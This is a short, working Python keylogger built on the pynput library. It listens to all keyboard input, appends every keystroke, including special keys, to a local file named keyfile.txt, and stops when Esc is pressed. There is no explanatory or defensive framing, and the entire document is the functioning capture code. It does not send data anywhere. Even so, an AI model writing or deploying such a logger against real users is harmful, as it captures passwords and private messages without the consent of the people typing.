from pynput import keyboard

def on_press(key):
    try:
        #create and write to a file
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(f"{key.char}")
    except AttributeError:
        # Handle special keys 
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener on pressing esc
        return False

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()